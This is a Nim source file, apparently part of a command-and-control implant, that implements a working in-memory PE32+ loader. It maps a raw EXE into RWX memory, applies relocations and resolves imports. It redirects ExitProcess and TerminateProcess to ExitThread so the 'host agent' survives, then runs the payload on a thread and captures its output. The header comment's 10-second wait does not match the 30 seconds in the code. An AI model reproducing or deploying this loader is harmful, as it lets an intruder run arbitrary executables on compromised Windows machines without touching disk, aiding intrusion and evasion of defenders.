## Inline PE execution — in-process PE32+ loader for x64 EXEs.
##
## Phases:
##  1. Parse and validate PE headers (DOS → NT → Optional, PE32+ only)
##  2. VirtualAlloc the full image at the preferred base (or any address)
##  3. Copy PE headers and sections into allocated memory
##  4. Apply base relocations (IMAGE_REL_BASED_DIR64, type 10)
##  5. Resolve the import address table via LoadLibraryA + GetProcAddress
##  6. Set per-section memory protections via VirtualProtect
##  7. Spawn a thread at the entry point; wait up to 10 s then detach

import winim/lean

# ExitProcess redirect: standard EXE CRT startup calls ExitProcess on return,
# killing the host agent.  Redirect IAT entry to ExitThread instead.
proc fakeExitProcess(uExitCode: UINT) {.stdcall.} =
  ExitThread(0)

# ── Little-endian byte readers ────────────────────────────────────────────────

proc u16le(d: seq[byte]; o: int): uint16 {.inline.} =
  uint16(d[o]) or (uint16(d[o+1]) shl 8)

proc u32le(d: seq[byte]; o: int): uint32 {.inline.} =
  uint32(d[o]) or (uint32(d[o+1]) shl 8) or
  (uint32(d[o+2]) shl 16) or (uint32(d[o+3]) shl 24)

proc u64le(d: seq[byte]; o: int): uint64 {.inline.} =
  uint64(d[o])           or (uint64(d[o+1]) shl  8) or
  (uint64(d[o+2]) shl 16) or (uint64(d[o+3]) shl 24) or
  (uint64(d[o+4]) shl 32) or (uint64(d[o+5]) shl 40) or
  (uint64(d[o+6]) shl 48) or (uint64(d[o+7]) shl 56)

# ── PE section characteristics → VirtualProtect flags ────────────────────────

proc peCharsToProt(c: uint32): DWORD =
  const
    scnExec  = 0x20000000'u32
    scnWrite = 0x80000000'u32
  let exec  = (c and scnExec)  != 0
  let write = (c and scnWrite) != 0
  if exec and write: return PAGE_EXECUTE_READWRITE
  if exec:           return PAGE_EXECUTE_READ
  if write:          return PAGE_READWRITE
  PAGE_READONLY

# ── Public entry point ────────────────────────────────────────────────────────

proc execPE*(pebytes: seq[byte]): string =
  ## Load raw PE32+ bytes and execute the entry point in-process.
  ## Returns a status string or an error message.

  if pebytes.len < 0x40:
    return "[error: payload too small to be a PE]"

  # ── Phase 1: DOS header ──────────────────────────────────────────────────
  if u16le(pebytes, 0) != 0x5A4D'u16:      # "MZ"
    return "[error: missing MZ signature]"
  let peOff = int(u32le(pebytes, 0x3C))
  if peOff + 24 > pebytes.len:
    return "[error: e_lfanew out of bounds]"
  if u32le(pebytes, peOff) != 0x00004550'u32:  # "PE\0\0"
    return "[error: missing PE signature]"

  # File header (peOff+4)
  if u16le(pebytes, peOff + 4) != 0x8664'u16:
    return "[error: not AMD64; only PE32+ (0x8664) supported]"
  let nSec     = int(u16le(pebytes, peOff + 6))
  let optHdrSz = int(u16le(pebytes, peOff + 20))

  # Optional header (must be PE32+, magic = 0x020B)
  let optOff = peOff + 24
  if optOff + 2 > pebytes.len or u16le(pebytes, optOff) != 0x020B'u16:
    return "[error: not a PE32+ (64-bit) image]"

  # Key optional-header fields
  let entryRVA      = u32le(pebytes, optOff + 16)   # AddressOfEntryPoint
  let preferredBase = u64le(pebytes, optOff + 24)   # ImageBase
  let imgSz         = int(u32le(pebytes, optOff + 56))  # SizeOfImage
  var hdrSz         = int(u32le(pebytes, optOff + 60))  # SizeOfHeaders
  let nDirs         = int(u32le(pebytes, optOff + 108)) # NumberOfRvaAndSizes

  # DataDirectory for PE32+ starts at optOff+112; entries are 8 bytes each.
  # [1] Import table  → base+8
  # [5] Base reloc    → base+40
  # [14] COM/.NET    → base+112
  let ddBase = optOff + 112

  # .NET detection: IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR = 14
  if nDirs > 14 and ddBase + 14*8 + 8 <= pebytes.len:
    let comVA = u32le(pebytes, ddBase + 14*8)
    let comSz = u32le(pebytes, ddBase + 14*8 + 4)
    if comVA != 0 and comSz != 0:
      return "[error: .NET assembly — use dotnet-exec instead]"
  var impVA, impSz, relocVA, relocSz: uint32
  if ddBase + 16 <= pebytes.len:
    impVA = u32le(pebytes, ddBase + 8)
    impSz = u32le(pebytes, ddBase + 12)
  if ddBase + 48 <= pebytes.len:
    relocVA = u32le(pebytes, ddBase + 40)
    relocSz = u32le(pebytes, ddBase + 44)

  # ── Section table (IMAGE_SECTION_HEADER, 40 bytes each) ──────────────────
  # Offsets within each header:
  #   +8   VirtualSize
  #   +12  VirtualAddress (RVA)
  #   +16  SizeOfRawData
  #   +20  PointerToRawData
  #   +36  Characteristics
  type PESection = object
    va, vsz, rawOff, rawSz, chars: uint32
  let secBase = optOff + optHdrSz
  var sections: seq[PESection]
  for i in 0 ..< nSec:
    let o = secBase + i * 40
    if o + 40 > pebytes.len: break
    sections.add PESection(
      vsz:    u32le(pebytes, o +  8),
      va:     u32le(pebytes, o + 12),
      rawSz:  u32le(pebytes, o + 16),
      rawOff: u32le(pebytes, o + 20),
      chars:  u32le(pebytes, o + 36))

  # ── Phase 2: Allocate memory ──────────────────────────────────────────────
  # Try the preferred ImageBase first; fall back to any address.
  let allocType = DWORD(MEM_COMMIT or MEM_RESERVE)
  var base = cast[int](VirtualAlloc(
    cast[LPVOID](int(preferredBase)), SIZE_T(imgSz),
    allocType, PAGE_EXECUTE_READWRITE))
  if base == 0:
    base = cast[int](VirtualAlloc(nil, SIZE_T(imgSz), allocType, PAGE_EXECUTE_READWRITE))
  if base == 0:
    return "[error: VirtualAlloc failed]"

  # ── Phase 3a: Copy PE headers ─────────────────────────────────────────────
  if hdrSz > pebytes.len: hdrSz = pebytes.len
  copyMem(cast[pointer](base), unsafeAddr pebytes[0], hdrSz)

  # ── Phase 3b: Copy sections ───────────────────────────────────────────────
  for s in sections:
    if s.rawSz == 0 or s.rawOff == 0: continue
    let srcEnd = int(s.rawOff) + int(s.rawSz)
    if srcEnd > pebytes.len: continue
    if uint64(s.va) + uint64(s.rawSz) > uint64(imgSz): continue
    copyMem(cast[pointer](base + int(s.va)),
            unsafeAddr pebytes[int(s.rawOff)], int(s.rawSz))

  # ── Phase 4: Base relocations (IMAGE_REL_BASED_DIR64 = type 10) ──────────
  let delta = int64(base) - int64(preferredBase)
  if delta != 0 and relocVA != 0 and relocSz != 0:
    var p    = base + int(relocVA)
    let rEnd = p + int(relocSz)
    while p + 8 <= rEnd:
      let bva = cast[ptr uint32](p)[]
      let bsz = cast[ptr uint32](p + 4)[]
      if bsz < 8 or int(bsz) > rEnd - p: break
      let cnt = (bsz - 8) div 2
      for j in 0 ..< cnt:
        let e   = cast[ptr uint16](p + 8 + int(j) * 2)[]
        let typ = e shr 12
        let off = uint32(e and 0x0FFF)
        if typ == 10:   # IMAGE_REL_BASED_DIR64
          let pa = cast[ptr int64](base + int(bva) + int(off))
          pa[] += delta
      p += int(bsz)

  # ── Phase 5: Import Address Table ─────────────────────────────────────────
  # IMAGE_IMPORT_DESCRIPTOR (20 bytes, null-terminated array):
  #   +0   OriginalFirstThunk (RVA of INT)
  #   +12  Name              (RVA of DLL name)
  #   +16  FirstThunk        (RVA of IAT)
  #
  # IMAGE_THUNK_DATA64 (8 bytes):
  #   bit63 set  → ordinal (bits 0-15)
  #   bit63 clear → RVA to IMAGE_IMPORT_BY_NAME { WORD Hint; CHAR Name[]; }
  if impVA != 0 and impSz != 0:
    var descOff = int(impVA)
    while true:
      let dp      = base + descOff
      let oft     = cast[ptr uint32](dp +  0)[]   # OriginalFirstThunk
      let nameRVA = cast[ptr uint32](dp + 12)[]   # Name RVA
      let ft      = cast[ptr uint32](dp + 16)[]   # FirstThunk (IAT)
      if nameRVA == 0: break                       # null terminator

      let hDLL = LoadLibraryA(cast[cstring](base + int(nameRVA)))
      if hDLL != 0:
        let intBase = base + int(if oft != 0: oft else: ft)
        let iatBase = base + int(ft)
        var j = 0
        while true:
          let thunk = cast[ptr uint64](intBase + j)[]
          if thunk == 0: break
          var fn: int
          if (thunk shr 63) == 1:
            # Ordinal import: low 16 bits = ordinal number
            fn = cast[int](GetProcAddress(hDLL,
                   cast[cstring](int(thunk and 0xFFFF'u64))))
          else:
            # Named import: thunk is RVA to IMAGE_IMPORT_BY_NAME; skip 2-byte Hint
            let fnName = cast[cstring](base + int(thunk) + 2)
            fn = cast[int](GetProcAddress(hDLL, fnName))
            # Intercept ExitProcess/TerminateProcess to prevent killing host agent
            if fn != 0 and ($fnName == "ExitProcess" or $fnName == "TerminateProcess"):
              fn = cast[int](fakeExitProcess)
          cast[ptr int](iatBase + j)[] = fn
          j += 8
      descOff += 20

  # ── Phase 6: Per-section memory protections ───────────────────────────────
  for s in sections:
    if s.rawSz == 0: continue
    var old: DWORD
    discard VirtualProtect(cast[LPVOID](base + int(s.va)),
                           SIZE_T(s.rawSz), peCharsToProt(s.chars), addr old)

  # ── Phase 7: Redirect stdout/stderr, run entry point ─────────────────────
  var pipeRead, pipeWrite: HANDLE
  var sa: SECURITY_ATTRIBUTES
  sa.nLength = DWORD(sizeof(sa))
  sa.bInheritHandle = TRUE
  let pipeOk = CreatePipe(addr pipeRead, addr pipeWrite, addr sa, 0) != 0
  if pipeOk:
    discard SetHandleInformation(pipeRead, HANDLE_FLAG_INHERIT, 0)

  let oldStdout = GetStdHandle(STD_OUTPUT_HANDLE)
  let oldStderr = GetStdHandle(STD_ERROR_HANDLE)
  if pipeOk:
    SetStdHandle(STD_OUTPUT_HANDLE, pipeWrite)
    SetStdHandle(STD_ERROR_HANDLE, pipeWrite)

  var tid: DWORD
  let hThread = CreateThread(nil, 0,
    cast[LPTHREAD_START_ROUTINE](base + int(entryRVA)), nil, 0, addr tid)

  if hThread == 0:
    if pipeOk:
      SetStdHandle(STD_OUTPUT_HANDLE, oldStdout)
      SetStdHandle(STD_ERROR_HANDLE, oldStderr)
      discard CloseHandle(pipeWrite)
      discard CloseHandle(pipeRead)
    return "[error: CreateThread failed (err " & $GetLastError() & ")]"

  # Wait up to 30 s for the entry point to return
  let r = WaitForSingleObject(hThread, 30000)
  discard CloseHandle(hThread)

  if pipeOk:
    SetStdHandle(STD_OUTPUT_HANDLE, oldStdout)
    SetStdHandle(STD_ERROR_HANDLE, oldStderr)
    discard CloseHandle(pipeWrite)

  if r == DWORD(0x00000102):   # WAIT_TIMEOUT
    if pipeOk: discard CloseHandle(pipeRead)
    return "[+] PE executing (async \xe2\x80\x94 entry point did not return within 30 s)"

  # ── Phase 8: Collect captured output ─────────────────────────────────────
  if not pipeOk:
    return "[+] PE executed (output not captured)"

  var output = ""
  var buf: array[4096, char]
  var rd: DWORD
  while ReadFile(pipeRead, addr buf[0], DWORD(buf.len), addr rd, nil) != 0 and rd > 0:
    var chunk = newString(int(rd))
    copyMem(addr chunk[0], addr buf[0], int(rd))
    output.add(chunk)
  discard CloseHandle(pipeRead)

  if output.len == 0:
    return "[+] PE executed (no output)"
  return output
